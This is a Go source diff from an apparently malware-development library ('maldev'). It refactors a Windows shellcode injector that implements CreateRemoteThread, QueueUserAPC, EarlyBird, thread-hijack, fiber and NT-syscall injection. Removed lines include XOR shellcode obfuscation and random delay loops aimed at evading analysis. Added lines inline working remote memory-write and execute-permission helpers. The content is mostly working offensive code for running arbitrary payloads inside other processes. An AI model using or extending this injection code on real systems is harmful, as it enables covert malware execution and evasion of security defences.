@@ -3,9 +3,7 @@
 package inject
 
 import (
-	"crypto/rand"
 	"fmt"
-	"math/big"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
@@ -15,11 +13,8 @@ import (
 
 // Windows injection constants
 const (
-	threadWaitTimeout          = 2000
-	cpuDelayMaxIterations      = 5000000
-	cpuDelayFallbackIterations = 3000000
-
-	contextFull = 0x10001F // CONTEXT_FULL (x64)
+	threadWaitTimeout = 2000
+	contextFull       = 0x10001F // CONTEXT_FULL (x64)
 )
 
 // context64 is a local alias for api.Context64 (x64 thread context).
@@ -28,51 +23,6 @@ type context64 = api.Context64
 // windowsInjector implements injection for Windows.
 type windowsInjector struct {
 	config *Config
-}
-
-func validateShellcode(shellcode []byte) error {
-	if len(shellcode) == 0 {
-		return fmt.Errorf("shellcode is empty")
-	}
-	return nil
-}
-
-func xorEncodeShellcode(shellcode []byte) (encoded []byte, key byte, err error) {
-	xorKey := make([]byte, 1)
-	_, err = rand.Read(xorKey)
-	if err != nil {
-		return nil, 0, fmt.Errorf("failed to generate XOR key: %w", err)
-	}
-	key = xorKey[0]
-
-	encoded = make([]byte, len(shellcode))
-	copy(encoded, shellcode)
-	for i := range encoded {
-		encoded[i] ^= key
-	}
-
-	return encoded, key, nil
-}
-
-func xorDecodeInPlace(addr uintptr, size int, key byte) {
-	for i := 0; i < size; i++ {
-		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
-		*ptr ^= key
-	}
-}
-
-func cpuDelay() {
-	iterations, err := rand.Int(rand.Reader, big.NewInt(cpuDelayMaxIterations))
-	if err != nil {
-		iterations = big.NewInt(cpuDelayFallbackIterations)
-	}
-	limit := iterations.Int64()
-
-	var counter int64
-	for counter < limit {
-		counter++
-		_ = counter * 2
-	}
 }
 
 func newPlatformInjector(cfg *Config) (Injector, error) {
@@ -133,7 +83,7 @@ func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
 	if err != nil {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
@@ -250,7 +200,7 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
 	if err != nil {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
@@ -276,14 +226,19 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 		}
 
 		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))
+		suspended := count != 0xFFFFFFFF // 0xFFFFFFFF means SuspendThread failed
 
-		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
+		apcRet, _, apcErr := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
 
 		windows.ResumeThread(hThread)
-
 		windows.CloseHandle(hThread)
 
-		if apcRet != 0 && count != 0xFFFFFFFF {
+		if apcRet == 0 {
+			// QueueUserAPC returns 0 on failure
+			_ = apcErr
+			continue
+		}
+		if suspended {
 			success = true
 			break
 		}
@@ -328,7 +283,7 @@ func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, nil)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return fmt.Errorf("remote memory setup failed: %w", err)
@@ -385,7 +340,7 @@ func (w *windowsInjector) injectThreadHijack(shellcode []byte) error {
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, nil)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return fmt.Errorf("remote memory setup failed: %w", err)
@@ -436,7 +391,7 @@ func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
 	if err != nil {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
@@ -477,7 +432,7 @@ func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
 	}
 
 	// 1. Allocate and prepare memory (RW -> Copy -> RX)
-	addr, err := allocateAndWriteMemoryLocal(shellcode)
+	addr, err := allocateAndWriteMemoryLocalWithCaller(shellcode, nil)
 	if err != nil {
 		return fmt.Errorf("memory allocation failed: %w", err)
 	}
@@ -561,7 +516,7 @@ func (w *windowsInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
+	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
 	if err != nil {
 		return fmt.Errorf("remote memory setup failed: %w", err)
 	}
@@ -640,89 +595,29 @@ func findAllThreads(pid int) ([]uint32, error) {
 	return threads, nil
 }
 
-func allocateAndWriteMemoryLocal(shellcode []byte) (uintptr, error) {
-	// 1. Allocate with PAGE_READWRITE
-	addr, err := windows.VirtualAlloc(
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_READWRITE,
-	)
-	if err != nil {
-		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
-	}
-
-	// 2. Copy shellcode (RtlMoveMemory is void — no return value check)
-	api.ProcRtlMoveMemory.Call(
-		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-	)
-
-	// 3. Change permissions to PAGE_EXECUTE_READ
-	var oldProtect uint32
-	err = windows.VirtualProtect(
-		addr,
-		uintptr(len(shellcode)),
-		windows.PAGE_EXECUTE_READ,
-		&oldProtect,
-	)
-	if err != nil {
-		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
-	}
-
-	return addr, nil
-}
-
-func allocateAndWriteMemoryRemote(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
-	// 1. Allocate with PAGE_READWRITE
-	addr, _, err := api.ProcVirtualAllocEx.Call(
-		uintptr(hProcess),
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_READWRITE,
-	)
-	if addr == 0 {
-		return 0, fmt.Errorf("VirtualAllocEx failed: %w", err)
-	}
-
-	// 2. Write shellcode
-	err = windows.WriteProcessMemory(
-		hProcess,
-		addr,
-		&shellcode[0],
-		uintptr(len(shellcode)),
-		nil,
-	)
-	if err != nil {
-		return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
-	}
-
-	// 3. Change permissions to PAGE_EXECUTE_READ
-	var oldProtect uint32
-	err = windows.VirtualProtectEx(
-		hProcess,
-		addr,
-		uintptr(len(shellcode)),
-		windows.PAGE_EXECUTE_READ,
-		&oldProtect,
-	)
-	if err != nil {
-		return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
-	}
-
-	return addr, nil
-}
-
-// --- Caller-aware helpers (used by windowsSyscallInjector) ---
+// --- Memory helpers (Caller-aware, nil falls back to standard WinAPI) ---
 
 // allocateAndWriteMemoryRemoteWithCaller uses NT syscalls via the Caller to
 // allocate, write, and protect remote process memory. If caller is nil it
-// falls back to allocateAndWriteMemoryRemote.
+// falls back to standard WinAPI (VirtualAllocEx / WriteProcessMemory / VirtualProtectEx).
 func allocateAndWriteMemoryRemoteWithCaller(hProcess windows.Handle, shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
 	if caller == nil {
-		return allocateAndWriteMemoryRemote(hProcess, shellcode)
+		// WinAPI fallback path
+		addr, _, err := api.ProcVirtualAllocEx.Call(
+			uintptr(hProcess), 0, uintptr(len(shellcode)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
+		)
+		if addr == 0 {
+			return 0, fmt.Errorf("VirtualAllocEx failed: %w", err)
+		}
+		if err := windows.WriteProcessMemory(hProcess, addr, &shellcode[0], uintptr(len(shellcode)), nil); err != nil {
+			return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
+		}
+		var oldProtect uint32
+		if err := windows.VirtualProtectEx(hProcess, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+			return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
+		}
+		return addr, nil
 	}
 
 	// 1. NtAllocateVirtualMemory (remote)
@@ -775,10 +670,21 @@ func allocateAndWriteMemoryRemoteWithCaller(hProcess windows.Handle, shellcode [
 
 // allocateAndWriteMemoryLocalWithCaller uses NT syscalls via the Caller to
 // allocate, write, and protect local (current process) memory.
-// If caller is nil it falls back to allocateAndWriteMemoryLocal.
+// If caller is nil it falls back to standard WinAPI (VirtualAlloc / RtlMoveMemory / VirtualProtect).
 func allocateAndWriteMemoryLocalWithCaller(shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
 	if caller == nil {
-		return allocateAndWriteMemoryLocal(shellcode)
+		// WinAPI fallback path
+		addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+		if err != nil {
+			return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
+		}
+		api.ProcRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+		var oldProtect uint32
+		if err := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+			return 0, fmt.Errorf("VirtualProtect failed: %w", err)
+		}
+		return addr, nil
 	}
 
 	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // pseudo-handle
